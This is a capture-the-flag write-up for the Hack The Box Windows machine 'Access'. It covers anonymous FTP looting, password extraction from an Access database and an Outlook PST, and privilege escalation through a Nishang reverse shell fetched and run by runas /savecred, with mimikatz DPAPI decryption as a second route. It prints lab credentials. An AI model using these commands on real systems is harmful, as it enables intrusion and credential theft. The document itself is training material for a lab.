# 🧭 HTB: Access

## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)
**Skills**: FTP enumeration, PST extraction, Telnet login, credential dumping, DPAPI decryption

---

## 🔍 Recon

```bash
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.98
nmap -sV -sC -p 21,23,80 -oA nmap/scripts 10.10.10.98
```

**Findings**:
- [FTP](FTP) (21): Anonymous login allowed
- [Telnet](TELNET) (23)
- [HTTP](HTTP) (80): Microsoft IIS 7.5

---

## 🌐 Exploring HTTP

```bash
gobuster -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,txt -t 20
```

- No interesting directories found
- Image shown on homepage

---

## 📁 FTP File Extraction

```bash
ftp 10.10.10.98
# Login: anonymous
# Navigate and download files
cd Backups
bin
get backup.mdb

cd ../Engineer
get "Access Control.zip"
```

---

## 🧵 Analyzing backup.mdb (Microsoft Access DB)

```bash
apt install mdbtools
mdb-tables backup.mdb
mdb-export backup.mdb auth_user
```

**Findings**:
```txt
engineer : access4u@security
```

---

## 🔓 Crack PST Archive

```bash
7z x Access\ Control.zip  # Password: access4u@security
```

---

## 📬 Extract Outlook Password (readpst)

```bash
apt install readpst
readpst Access\ Control.pst
cat Access\ Control.mbox
```

**Email content**:
```txt
security : 4Cc3ssC0ntr0ller
```

---

## 💻 Shell as security via Telnet

```bash
telnet 10.10.10.98
# Login: security / 4Cc3ssC0ntr0ller

whoami
type C:\Users\security\Desktop\user.txt
```

---

## 🔎 Privilege Escalation Enumeration

```cmd
cmdkey /list
```

**Findings**:
- Cached credentials for ACCESS\Administrator
- Found `.lnk` file referencing `runas /savecred`

---

## 🔄 Method 1: PrivEsc via runas & PowerShell reverse shell

### 🛠️ Prep Nishang shell

```bash
git clone https://github.com/samratashok/nishang.git
mkdir ~/www
cp nishang/Shells/Invoke-PowerShellTcp.ps1 ~/www/
echo 'Invoke-PowerShellTcp -Reverse -IPAddress <tun0_ip> -Port 443' >> ~/www/Invoke-PowerShellTcp.ps1

# Serve it
cd ~/www
python3 -m http.server 80

# Listener
nc -lnvp 443
```

### 🏃 Execute from target

```powershell
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://<tun0_ip>/Invoke-PowerShellTcp.ps1')"
```

**Result**: Administrator shell ➜ `whoami`, then:
```powershell
type C:\users\administrator\desktop\root.txt
```

---

## 🔄 Method 2: PrivEsc via DPAPI Credential Decryption

### 📤 Extract & Encode

```cmd
certutil -encode 0792c32e... output
certutil -encode 51AB168B... output
```

### 📥 Decode on Kali

```bash
base64 -d masterkey.b64 > masterkey
base64 -d credentials.b64 > credentials
```

### 🧪 Decrypt with mimikatz on Windows

```powershell
dpapi::masterkey /in:masterkey /sid:S-1-5-21-... /password:4Cc3ssC0ntr0ller
dpapi::cred /in:credentials
```

**Extracted Administrator password**:
```
55Acc3ssS3cur1ty@megacorp
```

### 🔁 Telnet as Administrator

```bash
telnet 10.10.10.98
# Login: administrator / 55Acc3ssS3cur1ty@megacorp
cd desktop
type root.txt
```

---

## 🗂️ Beyond Root – Analyze LNK

### 🔎 On Windows

```powershell
$WScript = New-Object -ComObject WScript.Shell
$SC = Get-ChildItem *.lnk
$WScript.CreateShortcut($SC)
```

### 🔍 On Linux with pylnker

```bash
base64 -d lnk.b64 > lnk
python pylnker.py lnk
```